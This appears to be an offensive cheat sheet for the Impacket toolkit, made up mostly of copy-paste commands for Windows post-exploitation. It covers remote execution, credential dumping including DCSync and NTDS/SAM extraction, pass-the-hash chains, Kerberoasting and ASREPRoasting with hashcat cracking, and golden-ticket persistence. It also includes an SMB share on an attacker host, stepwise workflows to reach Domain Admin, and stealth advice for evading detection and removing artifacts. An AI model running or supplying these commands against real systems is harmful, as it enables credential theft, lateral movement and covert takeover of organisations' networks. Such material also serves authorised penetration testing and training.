# Impacket Toolkit Reference

Complete reference for the Impacket Python toolkit covering credential extraction, remote execution, SMB operations, Kerberos attacks, lateral movement, and information gathering for Windows post-exploitation.

---

## Installation and Setup

### Installation
```bash
pip3 install impacket
# or from source
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && pip3 install .
```

### Authentication Formats
```bash
# Username/Password
DOMAIN/username:password@target

# NTLM Hash
-hashes :NTLM_HASH DOMAIN/username@target

# Kerberos Ticket
-k -no-pass DOMAIN/username@target
```

---

## Remote Execution Tools

### Tool Comparison

| Tool | Method | Stealth | Use Case |
|------|--------|---------|----------|
| psexec.py | SMB + Service | Low | Standard execution |
| wmiexec.py | WMI | Medium | Semi-interactive shell |
| dcomexec.py | DCOM | High | Stealthy execution |
| atexec.py | Task Scheduler | Medium | Scheduled execution |
| smbexec.py | SMB | Medium | SMB-based execution |

### psexec.py
```bash
# Basic execution
impacket-psexec DOMAIN/username:password@<TARGET_IP>

# With hash
impacket-psexec -hashes :<NTLM_HASH> DOMAIN/username@<TARGET_IP>

# Execute specific command
impacket-psexec DOMAIN/username:password@<TARGET_IP> cmd.exe

# Upload and execute
impacket-psexec DOMAIN/username:password@<TARGET_IP> -file payload.exe
```

### wmiexec.py
```bash
# WMI-based execution
impacket-wmiexec DOMAIN/username:password@<TARGET_IP>

# PowerShell shell
impacket-wmiexec -shell-type powershell DOMAIN/username:password@<TARGET_IP>

# Single command
impacket-wmiexec DOMAIN/username:password@<TARGET_IP> "whoami"
```

### dcomexec.py
```bash
# DCOM-based execution (stealthiest)
impacket-dcomexec DOMAIN/username:password@<TARGET_IP>

# Specific DCOM object (MMC20, ShellWindows, ShellBrowserWindow)
impacket-dcomexec -object MMC20 DOMAIN/username:password@<TARGET_IP>
```

### atexec.py
```bash
# Task Scheduler execution
impacket-atexec DOMAIN/username:password@<TARGET_IP> "whoami"

# With hash
impacket-atexec -hashes :<NTLM_HASH> DOMAIN/username@<TARGET_IP> "cmd /c dir"
```

### smbexec.py
```bash
impacket-smbexec DOMAIN/username:password@<TARGET_IP>
impacket-smbexec -hashes :NTLM_HASH DOMAIN/username@<TARGET_IP>
```

---

## Credential Extraction

### secretsdump.py
```bash
# Local SAM/SYSTEM dump
impacket-secretsdump -sam sam -system system local

# Remote credential extraction
impacket-secretsdump DOMAIN/username:password@<TARGET_IP>
impacket-secretsdump -hashes :<NTLM_HASH> DOMAIN/username@<TARGET_IP>

# DCSync attack (requires Domain Admin)
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc

# Extract specific user
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-user Administrator

# NTDS.dit extraction
impacket-secretsdump -ntds ntds.dit -system system local
```

### dpapi.py
```bash
# DPAPI blob decryption
impacket-dpapi masterkey -file masterkey_file -sid S-1-5-21-... -password password

# Chrome credential extraction
impacket-dpapi chrome -file "Login Data" -key masterkey
```

---

## SMB Operations

### smbserver.py (File Sharing)
```bash
# Basic SMB server
impacket-smbserver share_name /path/to/share

# With authentication and SMB2 support
impacket-smbserver -smb2support share_name /path/to/share -username user -password pass

# On specific interface
impacket-smbserver -ip 192.168.1.100 share_name /path/to/share
```
```cmd
# Windows connection
net use Z: \\<ATTACKER_IP>\share_name /user:user pass
```

### smbclient.py
```bash
# List shares
impacket-smbclient DOMAIN/username:password@<TARGET_IP>

# Connect to specific share
impacket-smbclient DOMAIN/username:password@<TARGET_IP> -share C$

# Download file
impacket-smbclient DOMAIN/username:password@<TARGET_IP> -share C$ -file "Windows/System32/config/SAM"
```

---

## Kerberos Attacks

### ASREPRoast (GetNPUsers.py)
```bash
# User list (no credentials needed)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# With credentials
impacket-GetNPUsers DOMAIN/username:password -request -format hashcat -outputfile asrep.txt

# Target specific user
impacket-GetNPUsers DOMAIN/username:password -request -target-user victim_user

# Crack hashes
hashcat -m 18200 asrep.txt wordlist.txt
```

### Kerberoasting (GetUserSPNs.py)
```bash
# Request all SPNs
impacket-GetUserSPNs DOMAIN/username:password -request -format hashcat -outputfile kerberoast.txt

# Request all
impacket-GetUserSPNs DOMAIN/username:password -request-all

# Target specific SPN
impacket-GetUserSPNs DOMAIN/username:password -request-target SERVICE/target

# Crack hashes
hashcat -m 13100 kerberoast.txt wordlist.txt
```

### Ticket Operations

**Request TGT (getTGT.py)**
```bash
impacket-getTGT DOMAIN/username:password
impacket-getTGT -hashes :NTLM_HASH DOMAIN/username
impacket-getTGT DOMAIN/username:password -outputfile ticket.ccache
```

**Request Service Ticket (getST.py)**
```bash
impacket-getST -spn SERVICE/target DOMAIN/username:password

# With TGT
impacket-getST -spn SERVICE/target -k -no-pass DOMAIN/username

# Impersonation
impacket-getST -spn SERVICE/target -impersonate Administrator DOMAIN/username:password
```

**Use Kerberos Ticket**
```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAIN/username@<TARGET_IP>
```

**Convert Ticket Formats**
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

### Golden and Silver Tickets

```bash
# Golden ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain DOMAIN username

# Silver ticket
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain DOMAIN -spn SERVICE/target username

# Use golden ticket
export KRB5CCNAME=username.ccache
impacket-psexec -k -no-pass DOMAIN/username@<TARGET_IP>
```

---

## Lateral Movement

### Pass-the-Hash
```bash
# PSExec
impacket-psexec -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET_IP>

# WMIExec
impacket-wmiexec -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET_IP>

# SMBExec
impacket-smbexec -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET_IP>
```

### Pass-the-Hash Chain
```bash
# 1. Extract hashes from compromised host
impacket-secretsdump DOMAIN/username:password@<TARGET1>

# 2. Use hash on another system
impacket-psexec -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET2>

# 3. Extract more credentials
impacket-secretsdump -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET2>
```

---

## Information Gathering

### RPC Enumeration
```bash
impacket-rpcdump DOMAIN/username:password@<TARGET_IP>
impacket-rpcdump -port 135 <TARGET_IP>
```

### SAM Enumeration
```bash
impacket-samrdump DOMAIN/username:password@<TARGET_IP>
impacket-samrdump <TARGET_IP>    # Anonymous (if allowed)
```

### Service Management
```bash
impacket-services DOMAIN/username:password@<TARGET_IP> list
impacket-services DOMAIN/username:password@<TARGET_IP> start <service>
impacket-services DOMAIN/username:password@<TARGET_IP> stop <service>
```

### Registry Operations
```bash
# Query registry
impacket-reg DOMAIN/username:password@<TARGET_IP> query -keyName "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"

# Save registry hive
impacket-reg DOMAIN/username:password@<TARGET_IP> save -keyName "HKLM\SAM"

# Add registry key
impacket-reg DOMAIN/username:password@<TARGET_IP> add -keyName "HKLM\SOFTWARE\Test" -v TestValue -vt REG_SZ -vd "TestData"
```

### LDAP Enumeration
```bash
impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> -U
impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> --users
impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> --computers
```

### MSSQL Attacks
```bash
impacket-mssqlclient DOMAIN/username:password@<TARGET_IP>
impacket-mssqlclient DOMAIN/username:password@<TARGET_IP> -windows-auth
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
```

---

## Attack Workflows

### Initial Access to Domain Admin
```bash
# 1. ASREPRoast for initial foothold
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt

# 2. Kerberoast with valid credentials
impacket-GetUserSPNs DOMAIN/user:pass -request -format hashcat -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt

# 3. DCSync with service account
impacket-secretsdump DOMAIN/service_account:pass@<DC_IP> -just-dc
```

### Golden Ticket Persistence
```bash
# 1. Get KRBTGT hash (requires Domain Admin)
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-user krbtgt

# 2. Create golden ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain DOMAIN fake_admin

# 3. Use golden ticket
export KRB5CCNAME=fake_admin.ccache
impacket-psexec -k -no-pass DOMAIN/fake_admin@<TARGET_IP>
```

---

## Troubleshooting

### Common Issues
```bash
# Clock skew (Kerberos)
ntpdate -s <DC_IP>

# Kerberos configuration
export KRB5_CONFIG=/etc/krb5.conf

# DNS resolution
echo "<DC_IP> domain.local" >> /etc/hosts

# SMB signing issues
impacket-smbclient -no-smb2support DOMAIN/user:pass@<TARGET>
```

### Performance Tips
```bash
# Increase timeout
impacket-secretsdump -timeout 30 DOMAIN/user:pass@<TARGET>

# Reduce verbosity
impacket-psexec -quiet DOMAIN/user:pass@<TARGET>

# Use SMB2
impacket-smbclient -smb2support DOMAIN/user:pass@<TARGET>
```

---

## Quick Copy-Paste Templates
```bash
# Credential extraction
impacket-secretsdump DOMAIN/USERNAME:PASSWORD@TARGET_IP

# Remote execution
impacket-wmiexec DOMAIN/USERNAME:PASSWORD@TARGET_IP

# Pass-the-hash
impacket-psexec -hashes :NTLM_HASH DOMAIN/USERNAME@TARGET_IP

# SMB server
impacket-smbserver -smb2support share . -username user -password pass

# Kerberoasting
impacket-GetUserSPNs DOMAIN/USERNAME:PASSWORD -request -format hashcat -outputfile kerberoast.txt

# ASREPRoast
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt
```

---

## Operational Security

### Stealth Recommendations
| Tool | Stealth Level | Notes |
|------|---------------|-------|
| dcomexec.py | High | Less monitored than PSExec |
| wmiexec.py | Medium | Common admin tool |
| psexec.py | Low | Creates obvious service |
| atexec.py | Medium | Uses Task Scheduler |

- Avoid PSExec when stealth matters (creates services)
- Use WMIExec or DCOMExec for lower profile
- Clean up created services and artifacts
- Schedule activities during business hours

---

## Resources

- Impacket GitHub: https://github.com/SecureAuthCorp/impacket
- CrackMapExec: Network enumeration and exploitation
- BloodHound: Active Directory attack path analysis
- Rubeus: Kerberos interaction toolkit
- Mimikatz: Credential extraction and manipulation
